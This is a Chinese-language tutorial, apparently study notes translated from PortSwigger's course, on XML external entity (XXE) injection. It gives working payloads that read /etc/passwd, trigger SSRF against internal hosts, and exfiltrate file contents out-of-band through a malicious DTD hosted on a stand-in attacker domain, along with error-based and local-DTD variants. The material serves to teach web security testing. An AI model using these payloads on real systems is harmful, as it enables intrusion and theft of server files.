# XML 外部实体 (XXE) 注入

XML 外部实体注入（也称为 XXE）是一种 Web 安全漏洞，允许攻击者干扰应用程序对 XML 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。

[在某些情况下，攻击者可以通过利用 XXE 漏洞执行服务器端请求伪造(SSRF)](obsidian://open?vault=PortSwigger&file=9.Server-side%20request%20forgery(SSRF)) 攻击 来升级 XXE 攻击以破坏底层服务器或其他后端基础设施。

## 利用XXE检索文件

要执行从服务器文件系统中检索任意文件的 XXE 注入攻击，您需要通过两种方式修改提交的 XML：

-   引入（或编辑）一个`DOCTYPE`元素，该元素定义包含文件路径的外部实体。
-   编辑应用程序响应中返回的 XML 中的数据值，以使用定义的外部实体。

例如，假设购物应用程序通过向服务器提交以下 XML 来检查产品的库存水平：

>< ?xml version="1.0" encoding="UTF-8"?> 
>< stockCheck>< productId>381< /productId>< /stockCheck>

该应用程序对 XXE 攻击没有特别的防御措施，因此您可以`/etc/passwd`通过提交以下 XXE 有效负载来利用 XXE 漏洞检索文件：

>< ?xml version="1.0" encoding="UTF-8"?> 
><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
>< stockCheck>< productId>&xxe;< /productId>< /stockCheck>

此 XXE 有效负载定义了一个外部实体`&xxe;`，其值为`/etc/passwd`文件的内容，并使用该`productId`值内的实体。这会导致应用程序的响应包含文件的内容：

>Invalid product ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
>bin:x:2:2:bin:/bin:/usr/sbin/nologin
...

## 利用 XXE 进行 SSRF 攻击

除了检索敏感数据外，XXE 攻击的另一个主要影响是它们可用于执行服务器端请求伪造 (SSRF)。这是一个潜在的严重漏洞，可以诱导服务器端应用程序向服务器可以访问的任何 URL 发出 HTTP 请求。

要利用 XXE 漏洞执行[SSRF 攻击](https://portswigger.net/web-security/ssrf)，您需要使用要定位的 URL 定义外部 XML 实体，并在数据值中使用定义的实体。如果您可以在应用程序响应中返回的数据值中使用定义的实体，那么您将能够从应用程序响应中的 URL 查看响应，从而获得与后端系统的双向交互。如果没有，那么您将只能执行[盲目的 SSRF](https://portswigger.net/web-security/ssrf/blind)攻击（这仍然会产生严重后果）。

在以下 XXE 示例中，外部实体将导致服务器向组织基础架构内的内部系统发出后端 HTTP 请求：

><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>

## 盲目的 XXE 漏洞

有两种广泛的方法可以发现和利用盲目的 XXE 漏洞：

-   您可以触发带外网络交互，有时会在交互数据中泄露敏感数据。
-   您可以通过错误消息包含敏感数据的方式触发 XML 解析错误。

### 使用带外 ( OAST ) 技术检测盲 XXE

例如，您将定义一个外部实体，如下所示：

> <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>

有时，由于应用程序的某些输入验证或正在使用的 XML 解析器的某些强化，使用常规实体的 XXE 攻击会被阻止。在这种情况下，您可以改用 XML 参数实体

><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`

#### 利用盲目的 XXE 将数据带外泄露

通过带外技术检测盲目的 XXE 漏洞非常好，但实际上并不能说明如何利用该漏洞。攻击者真正想要实现的是泄露敏感数据。这可以通过盲目的 XXE 漏洞来实现，但它涉及攻击者在他们控制的系统上托管恶意 DTD，然后从带内 XXE 有效负载中调用外部 DTD。
恶意 DTD 泄露文件内容的示例`/etc/passwd`如下：

><!ENTITY % file SYSTEM "file:///etc/passwd"> 
><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> 
>%eval; 
>%exfiltrate;

此 DTD 执行以下步骤：
-   定义一个名为 的 XML 参数实体`file`，其中包含`/etc/passwd`文件的内容。
-   定义一个名为 的 XML 参数实体`eval`，其中包含另一个名为 的 XML 参数实体的动态声明`exfiltrate`。该`exfiltrate`实体将通过向攻击者的 Web 服务器发出 HTTP 请求来评估，该请求包含`file`URL 查询字符串中的实体值。
-   使用`eval`实体，这会导致执行实体的动态声明`exfiltrate`。
-   使用`exfiltrate`实体，以便通过请求指定的 URL 来评估其值。

然后，攻击者必须将恶意 DTD 托管在他们控制的系统上，通常是将其加载到他们自己的网络服务器上。例如，攻击者可能会在以下 URL 提供恶意 DTD：

>http://web-attacker.com/malicious.dtd

最后，攻击者必须向易受攻击的应用程序提交以下 XXE 有效负载：

><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>

这个 XXE 有效负载声明了一个名为的 XML 参数实体`xxe`，然后使用 DTD 中的实体。这将导致 XML 解析器从攻击者的服务器获取外部 DTD 并内联解释它。然后执行恶意 DTD 中定义的步骤，并将`/etc/passwd`文件传输到攻击者的服务器。

### 利用盲目 XXE 通过错误消息检索数据

利用盲目 XXE 的另一种方法是触发 XML 解析错误，其中错误消息包含您希望检索的敏感数据。如果应用程序在其响应中返回结果错误消息，这将是有效的。
您可以使用恶意外部 DTD 触发包含`/etc/passwd`文件内容的 XML 解析错误消息，如下所示：

><!ENTITY % file SYSTEM "file:///etc/passwd"> 
><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> 
>%eval; 
>%error;

此 DTD 执行以下步骤：
-   定义一个名为 的 XML 参数实体`file`，其中包含`/etc/passwd`文件的内容。
-   定义一个名为 的 XML 参数实体`eval`，其中包含另一个名为 的 XML 参数实体的动态声明`error`。将`error`通过加载名称包含实体值的不存在文件来评估`file`实体。
-   使用`eval`实体，这会导致执行实体的动态声明`error`。
-   使用`error`实体，以便通过尝试加载不存在的文件来评估其值，从而导致错误消息包含不存在的文件的名称，即文件的内容`/etc/passwd`。
调用恶意外部 DTD 将导致如下错误消息：

>java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
>bin:x:2:2:bin:/bin:/usr/sbin/nologin ...

## 通过重新利用本地 DTD 来利用盲 XXE

当带外交互被阻止时,不能通过带外连接泄露数据，也不能从远程服务器加载外部 DTD。
在这种情况下，由于 XML 语言规范中的漏洞，仍然可能触发包含敏感数据的错误消息。如果文档的 DTD 混合使用内部和外部 DTD 声明，则内部 DTD 可以重新定义在外部 DTD 中声明的实体。发生这种情况时，对在另一个参数实体的定义中使用 XML 参数实体的限制就会放宽。

例如，假设在服务器文件系统的位置有一个 DTD 文件`/usr/local/app/schema.dtd`，并且这个 DTD 文件定义了一个名为 的实体`custom_entity`。攻击者可以通过提交混合 DTD 来触发包含`/etc/passwd`文件内容的 XML 解析错误消息，如下所示：

><!DOCTYPE foo [ 
><!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> 
><!ENTITY % custom_entity ' 
><!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> 
>&#x25;eval; 
>&#x25;error; 
>'> 
>%local_dtd; 
>]>

此 DTD 执行以下步骤：

-   定义一个名为 的 XML 参数实体`local_dtd`，其中包含存在于服务器文件系统上的外部 DTD 文件的内容。
-   重新定义名为 的 XML 参数实体`custom_entity`，该实体已在外部 DTD 文件中定义。该实体被重新定义为包含已经描述[的基于错误的 XXE 漏洞利用](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages)`/etc/passwd`，用于触发包含文件内容的错误消息。
-   使用`local_dtd`实体，以便解释外部 DTD，包括`custom_entity`实体的重新定义值。这会产生所需的错误消息。

### 定位现有 DTD 文件以重新利用

由于这种 XXE 攻击涉及重新利用服务器文件系统上的现有 DTD，因此关键要求是找到合适的文件。这实际上非常简单。因为应用程序会返回 XML 解析器抛出的任何错误消息，所以您可以轻松地枚举本地 DTD 文件，只需尝试从内部 DTD 中加载它们。

例如，使用 GNOME 桌面环境的 Linux 系统通常在`/usr/share/yelp/dtd/docbookx.dtd`. 您可以通过提交以下 XXE 有效负载来测试此文件是否存在，如果该文件丢失，则会导致错误：

><!DOCTYPE foo [ 
><!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; 
>]>













